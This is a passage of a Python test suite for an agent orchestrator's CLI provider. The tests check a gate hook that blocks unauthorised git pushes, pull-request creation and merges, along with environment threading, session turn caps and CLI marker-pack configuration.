        tool_surface, "GATE_MATCHED_TOOLS", frozenset({"Bash", "Monitor"}),
    )
    settings = build_gate_settings(frozenset({"maestro/task/abc"}))
    assert settings["hooks"]["PreToolUse"][0]["matcher"] == "Bash|Monitor"


def _hook_command_argv() -> list[str]:
    settings = build_gate_settings(frozenset({"maestro/task/abc"}))
    command: str = settings["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
    return shlex.split(command)


def test_gate_hook_command_binds_running_interpreter() -> None:
    """Issue #4160: the hook launches the loop's own interpreter, not a bare
    PATH-resolved ``maestro`` whose absence exits 127 and fails open."""
    assert _hook_command_argv() == [
        sys.executable, "-P", "-m", "maestro.cli", GATE_SUBCOMMAND,
    ]


def test_gate_hook_command_quotes_interpreter_with_space(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(sys, "executable", "/opt/my venv/bin/python")
    argv = _hook_command_argv()
    assert argv[0] == "/opt/my venv/bin/python"
    assert argv[1:] == ["-P", "-m", "maestro.cli", GATE_SUBCOMMAND]


def test_build_gate_settings_without_branch_omits_env() -> None:
    """A falsy branch set (``None`` or empty) omits the settings ``env`` block
    entirely: the hook then reads no branch and the gate core denies every
    push fail-closed."""
    assert "env" not in build_gate_settings(None)
    settings = build_gate_settings(frozenset())
    assert "env" not in settings
    assert settings["hooks"]["PreToolUse"][0]["matcher"] == "Bash"


def test_serialize_gate_settings_round_trips() -> None:
    branches = frozenset({"b"})
    assert json.loads(serialize_gate_settings(branches)) == build_gate_settings(
        branches
    )


def test_strip_redirections_env_round_trip() -> None:
    """Proposal 096: the strip flag encodes only when true and decodes back."""
    assert strip_redirections_to_env(True) == {GATE_STRIP_REDIRECTIONS_ENV: "1"}
    assert strip_redirections_to_env(False) == {}
    assert strip_redirections_from_env(strip_redirections_to_env(True)) is True
    assert strip_redirections_from_env(strip_redirections_to_env(False)) is False
    assert strip_redirections_from_env({}) is False
    assert strip_redirections_from_env({GATE_STRIP_REDIRECTIONS_ENV: ""}) is False


def test_build_gate_settings_flag_off_is_byte_identical() -> None:
    """A flag-off (default) payload carries no strip env var — byte-identical to
    the pre-096 settings so the two enforcement paths cannot drift on default."""
    branches = frozenset({"maestro/task/abc"})
    settings = build_gate_settings(branches)
    assert GATE_STRIP_REDIRECTIONS_ENV not in settings.get("env", {})
    assert settings == build_gate_settings(branches, False)


def test_build_gate_settings_carries_strip_flag_when_on() -> None:
    """With the flag on the settings ``env`` block folds in the strip var
    alongside the branch encoding."""
    branches = frozenset({"maestro/task/abc"})
    settings = build_gate_settings(branches, True)
    assert settings["env"][GATE_STRIP_REDIRECTIONS_ENV] == "1"
    assert settings["env"][GATE_BRANCH_ENV] == '["maestro/task/abc"]'


def test_build_gate_settings_strip_flag_without_branches() -> None:
    """The strip flag alone (falsy branch set) still materialises an ``env``
    block carrying only the strip var — the hook then strips and fails closed."""
    settings = build_gate_settings(None, True)
    assert settings["env"] == {GATE_STRIP_REDIRECTIONS_ENV: "1"}


def test_serialize_gate_settings_round_trips_with_strip_flag() -> None:
    branches = frozenset({"b"})
    assert json.loads(
        serialize_gate_settings(branches, True)
    ) == build_gate_settings(branches, True)


def test_gate_helpers_read_strip_flag_off_hook() -> None:
    """proposal 096: both spawn builders read ``strip_redirections`` off the
    recognised hook — the settings ``env`` and the child env both carry the
    strip var when on, and neither carries it when off (byte-identical)."""
    from maestro.providers.cli_paced import _gate_env, _gate_settings_flags

    branches = frozenset({"maestro/evolve/abc"})
    on = QueryOptions(
        hooks=make_task_tool_hooks(branches, strip_redirections=True)
    )
    assert _gate_env(on)[GATE_STRIP_REDIRECTIONS_ENV] == "1"
    assert (
        json.loads(_gate_settings_flags(on)[1])["env"][GATE_STRIP_REDIRECTIONS_ENV]
        == "1"
    )
    off = QueryOptions(hooks=make_task_tool_hooks(branches))
    assert GATE_STRIP_REDIRECTIONS_ENV not in _gate_env(off)
    assert GATE_STRIP_REDIRECTIONS_ENV not in json.loads(
        _gate_settings_flags(off)[1]
    ).get("env", {})


def test_current_branch_env_round_trip() -> None:
    """Proposal 099: the current branch encodes only when truthy and decodes
    back; a falsy branch sets no variable and reads ``None`` (fail-closed)."""
    assert current_branch_to_env("maestro/evolve/abc") == {
        GATE_CURRENT_BRANCH_ENV: "maestro/evolve/abc",
    }
    assert current_branch_to_env(None) == {}
    assert current_branch_to_env("") == {}
    assert (
        current_branch_from_env(current_branch_to_env("maestro/evolve/abc"))
        == "maestro/evolve/abc"
    )
    assert current_branch_from_env(current_branch_to_env(None)) is None
    assert current_branch_from_env({}) is None
    assert current_branch_from_env({GATE_CURRENT_BRANCH_ENV: ""}) is None


def test_build_gate_settings_carries_current_branch_when_set() -> None:
    """With a current branch the settings ``env`` block folds in the branch var
    alongside the owned-set encoding."""
    branches = frozenset({"maestro/evolve/abc"})
    settings = build_gate_settings(branches, False, "maestro/evolve/abc")
    assert settings["env"][GATE_CURRENT_BRANCH_ENV] == "maestro/evolve/abc"
    assert settings["env"][GATE_BRANCH_ENV] == '["maestro/evolve/abc"]'


def test_build_gate_settings_no_current_branch_is_byte_identical() -> None:
    """A payload with no current branch carries no branch var — byte-identical
    to the pre-099 settings so the two enforcement paths cannot drift."""
    branches = frozenset({"maestro/evolve/abc"})
    settings = build_gate_settings(branches)
    assert GATE_CURRENT_BRANCH_ENV not in settings.get("env", {})
    assert settings == build_gate_settings(branches, False, None)


def test_serialize_gate_settings_round_trips_with_current_branch() -> None:
    branches = frozenset({"b"})
    assert json.loads(
        serialize_gate_settings(branches, True, "b")
    ) == build_gate_settings(branches, True, "b")


def test_run_gate_bash_hook_allows_bare_head_under_current_branch_env() -> None:
    """Proposal 099 end-to-end across the seam: with the owned set, the strip
    flag, and the current branch all in the env, the CLI-subprocess replica
    allows ``git push origin HEAD`` and denies it once the current branch is a
    protected ref."""
    branch = "maestro/evolve/abc"
    allow_env = {
        **allowed_branches_to_env(frozenset({branch})),
        **strip_redirections_to_env(True),
        **current_branch_to_env(branch),
    }
    stdin = io.StringIO(json.dumps(
        {"tool_name": "Bash",
         "tool_input": {"command": "git push origin HEAD 2>&1 | tail"}},
    ))
    stdout = io.StringIO()
    assert run_gate_bash_hook(stdin, stdout, allow_env) == 0
    assert json.loads(stdout.getvalue()) == {}

    deny_env = {
        **allowed_branches_to_env(frozenset({"main"})),
        **current_branch_to_env("main"),
    }
    stdin = io.StringIO(json.dumps(
        {"tool_name": "Bash", "tool_input": {"command": "git push origin HEAD"}},
    ))
    stdout = io.StringIO()
    assert run_gate_bash_hook(stdin, stdout, deny_env) == 0
    verdict = json.loads(stdout.getvalue())
    assert verdict["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_run_gate_bash_hook_denies_newline_separated_pr_create() -> None:
    """#4044 across the seam: a newline-separated ``gh pr create`` is denied
    by the CLI-subprocess replica just as its ``;``-chained form is."""
    env = {
        **allowed_branches_to_env(frozenset({"maestro/evolve/abc"})),
        **strip_redirections_to_env(True),
        **current_branch_to_env("maestro/evolve/abc"),
    }
    stdin = io.StringIO(json.dumps(
        {"tool_name": "Bash",
         "tool_input": {"command": "cd /r\ngh pr create --fill"}},
    ))
    stdout = io.StringIO()
    assert run_gate_bash_hook(stdin, stdout, env) == 0
    verdict = json.loads(stdout.getvalue())
    assert verdict["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_run_gate_bash_hook_denies_flags_first_gh_api_merge() -> None:
    """Issue #4045 across the cli_paced seam: a ``gh api`` merge whose method
    flag precedes the endpoint is denied by the subprocess replica too."""
    env = allowed_branches_to_env(frozenset({"maestro/task/x"}))
    stdin = io.StringIO(json.dumps(
        {"tool_name": "Bash",
         "tool_input": {"command": "gh api -X PUT repos/o/r/pulls/5/merge"}},
    ))
    stdout = io.StringIO()
    assert run_gate_bash_hook(stdin, stdout, env) == 0
    verdict = json.loads(stdout.getvalue())
    assert verdict["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_gate_helpers_read_current_branch_off_hook() -> None:
    """Proposal 099: both spawn builders read ``current_branch`` off the
    recognised hook — the settings ``env`` and the child env both carry the
    branch var when set, and neither carries it when unset (byte-identical)."""
    from maestro.providers.cli_paced import _gate_env, _gate_settings_flags

    branches = frozenset({"maestro/evolve/abc"})
    on = QueryOptions(
        hooks=make_task_tool_hooks(branches, current_branch="maestro/evolve/abc"),
    )
    assert _gate_env(on)[GATE_CURRENT_BRANCH_ENV] == "maestro/evolve/abc"
    assert (
        json.loads(_gate_settings_flags(on)[1])["env"][GATE_CURRENT_BRANCH_ENV]
        == "maestro/evolve/abc"
    )
    off = QueryOptions(hooks=make_task_tool_hooks(branches))
    assert GATE_CURRENT_BRANCH_ENV not in _gate_env(off)
    assert GATE_CURRENT_BRANCH_ENV not in json.loads(
        _gate_settings_flags(off)[1]
    ).get("env", {})


@pytest.mark.asyncio
async def test_query_with_task_gate_injects_settings_and_branch_env() -> None:
    """Step 3 acceptance (one-shot path): an action-gated spawn — options
    carrying the executor's ``make_task_tool_hooks`` mapping — folds the gate
    ``--settings`` payload onto the argv and the branch env onto the child."""
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p", options=QueryOptions(hooks=make_task_tool_hooks(frozenset({"maestro/task/abc"})))
    )
    settings = _gate_settings(captured["command"])
    hook = settings["hooks"]["PreToolUse"][0]["hooks"][0]
    assert hook == {"type": "command", "command": gate_hook_command()}
    assert settings["env"] == _ABC_ENV
    assert captured["env"] == _ABC_ENV


@pytest.mark.asyncio
async def test_create_session_bakes_gate_into_spawn() -> None:
    """Step 3 acceptance (session path): the executor's ``run_task`` /
    ``implementation`` sessions carry the gate on the session spawn, so every
    turn the session drives inherits it."""
    _, captured = _install_fake()
    await CliPacedProvider().create_session(
        options=QueryOptions(hooks=make_task_tool_hooks(frozenset({"maestro/task/abc"})))
    )
    settings = _gate_settings(captured["command"])
    assert settings["env"] == _ABC_ENV
    assert captured["env"] == _ABC_ENV


@pytest.mark.asyncio
async def test_query_without_hooks_spawns_ungated() -> None:
    """Step 3 acceptance (negative): a non-action-gated phase spawn — no hooks
    on the options — carries neither the gate settings nor the branch env."""
    _, captured = _install_fake()
    await CliPacedProvider().query("p", options=QueryOptions(allowed_tools=["Read"]))
    assert "--settings" not in (captured["command"] or [])
    assert captured["env"] is None


@pytest.mark.asyncio
async def test_branchless_gate_injects_settings_without_env() -> None:
    """A gate built with no branch still injects the settings hook, but sets no
    branch env — the subprocess gate then fails closed on every push, exactly
    like the in-process ``make_task_pretooluse_hook(None)``."""
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p", options=QueryOptions(hooks=make_task_tool_hooks(None))
    )
    settings = _gate_settings(captured["command"])
    assert "env" not in settings
    assert captured["env"] is None


@pytest.mark.asyncio
async def test_gate_combines_with_tool_policy_and_beta_env() -> None:
    """The gate rides the same spawn as tool policy and the child-env overrides:
    ``--allowedTools`` narrows the tool surface (the deny-by-default approval
    posture's no-modal path) while the gate env unions with the beta header."""
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p",
        options=QueryOptions(
            hooks=make_task_tool_hooks(frozenset({"maestro/task/abc"})),
            allowed_tools=["Read", "Bash"],
            betas=[LONG_CONTEXT_BETA],
        ),
    )
    assert _flag_values(captured["command"], "--allowedTools") == ["Read", "Bash"]
    assert _gate_settings(captured["command"])["env"] == _ABC_ENV
    assert captured["env"] == {
        "ANTHROPIC_CUSTOM_HEADERS": f"anthropic-beta: {LONG_CONTEXT_BETA}",
        GATE_BRANCH_ENV: '["maestro/task/abc"]',
    }


def test_gate_helpers_handle_none_and_unrecognized() -> None:
    """The gate selectors return empty for ``None`` options, hook-less options,
    and (defensively) an unrecognised hooks payload — that last case is
    unreachable through the public API, where ``_reject_unsupported_options``
    has already failed loud before any spawn command is built."""
    from maestro.providers.cli_paced import _gate_env, _gate_settings_flags

    assert _gate_settings_flags(None) == []
    assert _gate_settings_flags(QueryOptions()) == []
    assert _gate_settings_flags(QueryOptions(hooks={"PreToolUse": []})) == []
    assert _gate_env(None) == {}
    assert _gate_env(QueryOptions()) == {}
    assert _gate_env(QueryOptions(hooks={"PreToolUse": []})) == {}


def test_gate_helpers_encode_multi_branch_set() -> None:
    """proposal 093: a genuine two-branch owned gate — built directly, since
    the ``make_task_*`` shims only wrap one branch this increment — flows its
    full set through both spawn builders as one deterministically-sorted JSON
    list, and the ``--settings`` env block and the child env agree byte-for-byte
    (one encoder feeds both)."""
    from claude_agent_sdk import HookMatcher

    from maestro.providers.cli_paced import _gate_env, _gate_settings_flags
    from maestro.tool_gating import TaskGateHook

    branches = frozenset({"maestro/task/aaa", "maestro/evolve/bbb"})
    hooks = {
        "PreToolUse": [HookMatcher(matcher="Bash", hooks=[TaskGateHook(branches)])],
    }
    options = QueryOptions(hooks=hooks)
    expected_env = {GATE_BRANCH_ENV: '["maestro/evolve/bbb", "maestro/task/aaa"]'}
    assert _gate_env(options) == expected_env
    flags = _gate_settings_flags(options)
    assert flags[0] == "--settings"
    assert json.loads(flags[1])["env"] == expected_env


def test_tool_policy_flags_handles_none_and_empty() -> None:
    """``None`` options and options carrying no tool policy emit only the default
    ``Agent`` denial plus the ungated shell built-ins (issue #4381)."""
    from maestro.providers.cli_paced import _tool_policy_flags

    expected = ["--disallowedTools", "Agent", "Monitor"]
    assert _tool_policy_flags(None) == expected
    assert _tool_policy_flags(QueryOptions()) == expected


@pytest.mark.asyncio
async def test_query_with_max_turns_does_not_raise() -> None:
    """A one-shot query with ``max_turns`` is a single prompt-turn, so it runs
    without raising (the cap only bites a multi-turn session)."""
    client, _ = _install_fake(result=CLIQueryResult(response="ok"))
    out = await CliPacedProvider().query("p", options=QueryOptions(max_turns=3))
    assert out.response == "ok"
    assert client.queries[0][0] == "p"


@pytest.mark.asyncio
async def test_create_session_captures_max_turns() -> None:
    """``create_session`` records ``options.max_turns`` as the session's cap."""
    _install_fake()
    session = await CliPacedProvider().create_session(options=QueryOptions(max_turns=2))
    assert isinstance(session, cli_paced._CLISession)
    assert session.max_turns == 2


@pytest.mark.asyncio
async def test_session_serves_exactly_max_turns_then_stops() -> None:
    """A ``max_turns=N`` session serves N turns and the ``N+1``-th raises."""
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(max_turns=2))
    await provider.query_on_session(session, "one")
    await provider.query_on_session(session, "two")
    assert client.session is not None
    assert len(client.session.queries) == 2
    with pytest.raises(RuntimeError, match="max_turns cap"):
        await provider.query_on_session(session, "three")
    # The over-cap call ran no query — exactly N turns reached the CLI.
    assert len(client.session.queries) == 2


@pytest.mark.asyncio
async def test_session_max_turns_one_stops_after_first(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """``max_turns=1`` serves one turn; the second raises before any query and
    emits no WARNING — the over-cap path fails loud via ``RuntimeError``, not a log."""
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(max_turns=1))
    logger_name = "maestro.providers.cli_paced"
    with caplog.at_level(logging.WARNING, logger=logger_name):
        await provider.query_on_session(session, "first")
        with pytest.raises(RuntimeError, match="max_turns cap"):
            await provider.query_on_session(session, "second")
        # The over-cap call raises rather than logging — no WARNING reaches operators.
        assert [r for r in caplog.records if r.name == logger_name] == []
    assert client.session is not None
    assert len(client.session.queries) == 1


@pytest.mark.asyncio
async def test_session_without_max_turns_is_uncapped() -> None:
    """No ``max_turns`` leaves the session uncapped: repeated turns all run."""
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert session.max_turns is None
    for prompt in ("a", "b", "c"):
        await provider.query_on_session(session, prompt)
    assert client.session is not None
    assert len(client.session.queries) == 3


# ── long-context beta via child env (proposal 061 Step 7) ─────────────────


@pytest.mark.asyncio
async def test_query_threads_long_context_beta_env() -> None:
    """A query requesting the long-context beta spawns the CLI with the
    ``anthropic-beta`` header set on its child env (instead of raising)."""
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p", options=QueryOptions(betas=[LONG_CONTEXT_BETA])
    )
    assert captured["env"] == {
        cli_paced._CUSTOM_HEADERS_ENV: f"anthropic-beta: {LONG_CONTEXT_BETA}"
    }


@pytest.mark.asyncio
async def test_query_without_betas_passes_no_env() -> None:
    """No betas → ``env=None`` reaches the factory, so the child inherits this
    process's environment unchanged (the non-beta path is untouched)."""
    _, captured = _install_fake()
    await CliPacedProvider().query("p")
    assert captured["env"] is None


@pytest.mark.asyncio
async def test_create_session_bakes_long_context_beta_env() -> None:
    """A session built requesting the long-context beta bakes the
    ``anthropic-beta`` env into its spawn so every turn it drives carries it."""
    _, captured = _install_fake()
    await CliPacedProvider().create_session(
        options=QueryOptions(betas=[LONG_CONTEXT_BETA])
    )
    assert captured["env"] == {
        cli_paced._CUSTOM_HEADERS_ENV: f"anthropic-beta: {LONG_CONTEXT_BETA}"
    }


def test_beta_env_maps_long_context_and_rejects_others() -> None:
    """``_beta_env`` maps the long-context beta to the custom-headers env, returns
    ``{}`` for the no-beta cases, and raises for any un-mappable beta (including a
    mix of mappable + un-mappable — no partial mapping)."""
    from maestro.providers.cli_paced import _beta_env

    assert _beta_env(None) == {}
    assert _beta_env(QueryOptions()) == {}
    assert _beta_env(QueryOptions(betas=[])) == {}
    assert _beta_env(QueryOptions(betas=[LONG_CONTEXT_BETA])) == {
        cli_paced._CUSTOM_HEADERS_ENV: f"anthropic-beta: {LONG_CONTEXT_BETA}"
    }
    with pytest.raises(NotImplementedError, match="SDK betas"):
        _beta_env(QueryOptions(betas=["some-other-beta-2099-01-01"]))
    with pytest.raises(NotImplementedError, match="SDK betas"):
        _beta_env(QueryOptions(betas=[LONG_CONTEXT_BETA, "some-other-beta"]))


def test_default_client_factory_merges_env_over_os_environ(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The real factory merges the beta override **over** ``os.environ`` so the
    spawned ``claude`` keeps its inherited environment (a bare ``env`` dict would
    replace the subprocess environment wholesale, stripping ``PATH`` / API key)."""
    monkeypatch.setenv("MAESTRO_TEST_SENTINEL", "keep")
    client = cli_paced._default_client_factory(
        CLIQueryOptions(),
        None,
        {cli_paced._CUSTOM_HEADERS_ENV: "anthropic-beta: x"},
    )
    assert client._env is not None
    # The override is present...
    assert client._env[cli_paced._CUSTOM_HEADERS_ENV] == "anthropic-beta: x"
    # ...and pre-existing environment survives the merge.
    assert client._env["MAESTRO_TEST_SENTINEL"] == "keep"


def test_default_client_factory_no_env_leaves_child_inheriting() -> None:
    """No env override → ``AsyncClient`` keeps its ``env=None`` default, so the
    child inherits this process's environment rather than a replaced one."""
    client = cli_paced._default_client_factory(CLIQueryOptions())
    assert client._env is None


# ── no thinking budget in the child env (proposal 140) ─────────────────────


@pytest.mark.asyncio
async def test_query_with_effort_leaves_child_env_untouched() -> None:
    """An effort-bearing query injects no thinking budget — the child follows the
    CLI's own thinking config, so the env stays at ``None``."""
    _, captured = _install_fake()
    await CliPacedProvider().query("p", options=QueryOptions(effort="high"))
    assert captured["env"] is None


def test_child_env_unions_beta_and_gate_without_thinking() -> None:
    """``_child_env`` unions the beta header and the action-gate branch env and never
    emits ``MAX_THINKING_TOKENS``; an un-mappable beta still raises."""
    from maestro.providers.cli_paced import _child_env

    assert _child_env(None) == {}
    assert _child_env(QueryOptions(effort="high")) == {}
    env = _child_env(
        QueryOptions(
            betas=[LONG_CONTEXT_BETA],
            effort="high",
            hooks=make_task_tool_hooks(
                frozenset({"maestro/evolve/abc"}), current_branch="maestro/evolve/abc",
            ),
        )
    )
    assert env[cli_paced._CUSTOM_HEADERS_ENV] == f"anthropic-beta: {LONG_CONTEXT_BETA}"
    assert env[GATE_CURRENT_BRANCH_ENV] == "maestro/evolve/abc"
    assert "MAX_THINKING_TOKENS" not in env
    with pytest.raises(NotImplementedError, match="SDK betas"):
        _child_env(QueryOptions(betas=["some-other-beta-2099-01-01"]))


# ── session lifecycle ─────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_session_lifecycle_and_system_threading() -> None:
    client, captured = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()

    session = await provider.create_session(
        options=QueryOptions(cwd="/work"), system="SYS"
    )
    assert isinstance(session, cli_paced._CLISession)
    assert session.system == "SYS"
    assert captured["options"].cwd == "/work"

    out = await provider.query_on_session(
        session, "follow", caller="evolve", stream_idle_timeout_seconds=7.0
    )
    assert out.response == "answer"
    assert out.usage.caller == "evolve"
    # The follow-up re-prepends the session's baseline system prompt and the
    # per-call timeout override preserves the create-time cwd.
    assert client.session is not None
    sent_prompt, sent_opts = client.session.queries[0]
    assert sent_prompt == "SYS\n\nfollow"
    assert sent_opts.stream_idle_timeout_seconds == 7.0
    assert sent_opts.cwd == "/work"

    await provider.disconnect_session(session)
    assert client.session.closed is True


@pytest.mark.asyncio
async def test_query_on_session_multi_turn_emits_no_continuity_warning(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """The single-turn-equivalence WARNING is gone (proposal 061 Steps 1-2):
    transcript continuity now rides on ``maestro_sdk.Session``'s persistent
    runner / ``--resume`` respawn, so repeated turns on one handle are a
    continuing conversation, not silent drift to warn about."""
    _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session()
    logger_name = "maestro.providers.cli_paced"
    with caplog.at_level(logging.WARNING, logger=logger_name):
        await provider.query_on_session(session, "first")
        await provider.query_on_session(session, "second")
        await provider.query_on_session(session, "third")
    assert [r for r in caplog.records if r.name == logger_name] == []


@pytest.mark.asyncio
async def test_query_on_session_without_override_keeps_create_options() -> None:
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(cwd="/work"))
    await provider.query_on_session(session, "follow")
    assert client.session is not None
    _sent_prompt, sent_opts = client.session.queries[0]
    assert sent_opts is session.options
    assert sent_opts.cwd == "/work"


# ── error translation ─────────────────────────────────────────────────────


def test_default_client_factory_builds_async_client() -> None:
    """The real factory constructs an AsyncClient (which spawns no process
    until a query runs), so this is safe without a pty."""
    from maestro_sdk import AsyncClient

    client = cli_paced._default_client_factory(CLIQueryOptions(cwd="/tmp"))
    assert isinstance(client, AsyncClient)
    # No command override → AsyncClient keeps its default ``claude`` command.
    assert client._command == ["claude"]


def test_default_client_factory_applies_command_override() -> None:
    """A command override (the external-MCP path) reaches the AsyncClient's spawn
    command, so ``--mcp-config`` is carried into the eventual argv."""
    from maestro_sdk import AsyncClient

    command = ["claude", "--mcp-config", '{"mcpServers": {}}']
    client = cli_paced._default_client_factory(CLIQueryOptions(), command)
    assert isinstance(client, AsyncClient)
    assert client._command == command


def test_base_command_matches_sdk_default() -> None:
    """``_BASE_COMMAND`` (the base the external-MCP path appends ``--mcp-config``
    to) must stay in lockstep with ``AsyncClient``'s own default spawn command.

    The non-MCP path passes ``command=None`` and inherits the SDK default; the
    MCP path rebuilds the command from ``_BASE_COMMAND``. If the SDK ever changed
    its default command, only the MCP branch would silently drop the new default —
    so pin the two together here (against a real default-built client rather than
    the SDK's private ``_DEFAULT_COMMAND``) to catch the drift loudly.
    """
    default_client = cli_paced._default_client_factory(CLIQueryOptions())
    assert list(cli_paced._BASE_COMMAND) == default_client._command


# ── [sdk.cli_paced] Cadence + stream-idle config (proposal 056 Step 12) ────


def test_default_client_factory_uses_cadence_defaults_when_unconfigured() -> None:
    """Absent ``configure_cli_paced``, the factory builds a default Cadence."""
    from maestro_sdk import Cadence

    client = cli_paced._default_client_factory(CLIQueryOptions())
    # Cadence's eq excludes its RNG, so two default instances compare equal.
    assert client._cadence == Cadence()


def test_configure_cli_paced_applies_cadence_overrides() -> None:
    """Configured knobs override Cadence defaults; unset knobs keep theirs."""
    from maestro_sdk import Cadence

    cli_paced.configure_cli_paced(cadence_overrides={"mean_key_ms": 50.0, "cols": 80})
    client = cli_paced._default_client_factory(CLIQueryOptions())
    assert client._cadence.mean_key_ms == 50.0
    assert client._cadence.cols == 80
    # An unset knob keeps its Cadence default.
    assert (
        client._cadence.heartbeat_per_answer_char_ms
        == Cadence().heartbeat_per_answer_char_ms
    )


def test_configure_cli_paced_empty_overrides_keep_defaults() -> None:
    """An empty override map leaves the documented Cadence defaults untouched."""
    from maestro_sdk import Cadence

    cli_paced.configure_cli_paced(cadence_overrides={})
    client = cli_paced._default_client_factory(CLIQueryOptions())
    assert client._cadence == Cadence()


# ── [sdk.cli_paced] marker-pack threading (proposal 075 Step 3) ─────────────


def _layout_pack() -> Any:
    """A marker pack with one distinctive entry per family, so identity
    assertions can tell a threaded family from an omitted default."""
    from maestro_sdk import (
        ApprovalMarkers,
        ClientMarkers,
        MarkerPack,
        ParserMarkers,
        SlashProbeMarkers,
    )

    return MarkerPack(
        name="test-pack",
        min_version="2.0.0",
        max_version="2.9.9",
        client=ClientMarkers(idle=("> ",), session_id=("Session ID:",)),
        parser=ParserMarkers(chrome=("###",)),
        approvals=ApprovalMarkers(prompt=("Allow tool?",)),
        probe=SlashProbeMarkers(usage_plan=r"(?P<percent>\d+)% used"),
    )


def test_configure_cli_paced_marker_pack_threads_all_four_families() -> None:
    """A configured pack reaches the built client's client/parser/approval
    markers and replaces the module-level probe-marker seam."""
    pack = _layout_pack()
    cli_paced.configure_cli_paced(marker_pack=pack)
    client = cli_paced._default_client_factory(CLIQueryOptions())
    assert client._markers is pack.client
    assert client._parser_markers is pack.parser
    assert client._approval._markers is pack.approvals
    assert cli_paced._probe_markers is pack.probe


def test_configure_cli_paced_without_pack_keeps_default_markers() -> None:
    """No pack → construction arguments unchanged from today: every marker
    family is the package's empty default and the probe seam keeps
    DEFAULT_PROBE_MARKERS."""
    from maestro_sdk import (
        DEFAULT_APPROVAL_MARKERS,
        DEFAULT_CLIENT_MARKERS,
        DEFAULT_MARKERS,
        DEFAULT_PROBE_MARKERS,
    )

    cli_paced.configure_cli_paced()
    client = cli_paced._default_client_factory(CLIQueryOptions())
    assert client._markers is DEFAULT_CLIENT_MARKERS
    assert client._parser_markers is DEFAULT_MARKERS
    assert client._approval._markers is DEFAULT_APPROVAL_MARKERS
    assert cli_paced._probe_markers is DEFAULT_PROBE_MARKERS
    assert cli_paced._marker_pack is None


def test_configure_cli_paced_reconfigure_clears_marker_pack() -> None:
    """A reconfiguration without a pack drops the previous one — the same
    reset-to-defaults posture as the other [sdk.cli_paced] knobs."""
    from maestro_sdk import DEFAULT_PROBE_MARKERS

    cli_paced.configure_cli_paced(marker_pack=_layout_pack())
    cli_paced.configure_cli_paced()
    assert cli_paced._marker_pack is None
    assert cli_paced._probe_markers is DEFAULT_PROBE_MARKERS


# ── marker-pack resolution at the cli.main call site (075 Step 4) ──────────


def test_resolve_marker_pack_none_setting_resolves_to_no_pack() -> None:
    assert cli_paced.resolve_marker_pack("none") is None


def test_resolve_marker_pack_auto_applies_covering_pack(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """"auto" probes the CLI version and selects the newest covering pack."""
    from maestro_sdk import marker_packs as marker_packs_module

    pack = _layout_pack()
    monkeypatch.setattr(cli_paced, "detect_cli_version", lambda: "2.5.0")
    monkeypatch.setattr(marker_packs_module, "MARKER_PACKS", (pack,))
    assert cli_paced.resolve_marker_pack("auto") is pack


def test_resolve_marker_pack_auto_uncovered_warns_and_resolves_none(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture,
) -> None:
    """An "auto" that covers nothing names the detected version in one WARNING
    and proceeds pack-less — a loud, attributable degradation."""
    monkeypatch.setattr(cli_paced, "detect_cli_version", lambda: "9.9.9")
    with caplog.at_level(logging.WARNING):
        assert cli_paced.resolve_marker_pack("auto") is None
    warnings = [
        r.getMessage() for r in caplog.records
        if "no registered marker pack covers" in r.getMessage()
    ]
    assert len(warnings) == 1
    assert "9.9.9" in warnings[0]


def test_resolve_marker_pack_auto_undetected_version_warns(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture,
) -> None:
    """A failed version probe degrades to no-pack with the WARNING naming the
    probe failure rather than guessing a pack."""
    monkeypatch.setattr(cli_paced, "detect_cli_version", lambda: None)
    with caplog.at_level(logging.WARNING):
        assert cli_paced.resolve_marker_pack("auto") is None
    assert any("<undetected>" in r.getMessage() for r in caplog.records)


def test_resolve_marker_pack_named_pack_resolves(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from maestro_sdk import marker_packs as marker_packs_module

    pack = _layout_pack()
    monkeypatch.setattr(marker_packs_module, "MARKER_PACKS", (pack,))
    assert cli_paced.resolve_marker_pack("test-pack") is pack


def test_resolve_marker_pack_unknown_name_raises() -> None:
    """The named-pack backstop fails loud — config validation already gates
    this, so reaching it means the registry drifted after validation."""
    with pytest.raises(ValueError, match="unknown pack 'ghost-pack'"):
        cli_paced.resolve_marker_pack("ghost-pack")


# ── layout-drift sentinel, provider attribution (075 Step 5) ───────────────


@pytest.mark.asyncio
async def test_idle_drift_warns_once_naming_the_pack(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """A turn carrying the driver's idle-miss flag under a configured pack
    logs exactly one provider-side WARNING naming the pack, across turns."""
    cli_paced.configure_cli_paced(marker_pack=_layout_pack())
    _install_fake(
        result=CLIQueryResult(response="ok", idle_marker_missed=True)
    )
    provider = CliPacedProvider()
    with caplog.at_level(logging.WARNING):
        await provider.query("one", options=QueryOptions(cwd="/work"))
        await provider.query("two", options=QueryOptions(cwd="/work"))
    drift = [
        r.getMessage() for r in caplog.records
        if "did not match the CLI layout" in r.getMessage()
    ]
    assert len(drift) == 1
    assert "'test-pack'" in drift[0]


@pytest.mark.asyncio
async def test_idle_drift_without_pack_logs_no_provider_warning(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """No configured pack → nothing to attribute: the provider sentinel stays
    quiet even if a hand-built client set the miss flag."""
    _install_fake(
        result=CLIQueryResult(response="ok", idle_marker_missed=True)
    )
    provider = CliPacedProvider()
